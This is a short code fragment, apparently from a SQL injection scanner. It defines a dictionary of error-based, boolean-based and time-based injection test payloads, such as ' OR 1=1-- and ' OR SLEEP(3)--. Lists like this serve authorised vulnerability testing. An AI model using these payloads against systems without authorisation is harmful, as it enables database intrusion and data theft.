SQL_PAYLOADS={
    "error":[
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "') OR ('1'='1"
    ],
    "boolean":[
        "' AND 1=1--",
        "' AND 1=2--"
    ],
    "time":[
        "' OR SLEEP(3)--",
        "'; WAITFOR DELAY '0:0:3'--"
    ]
}
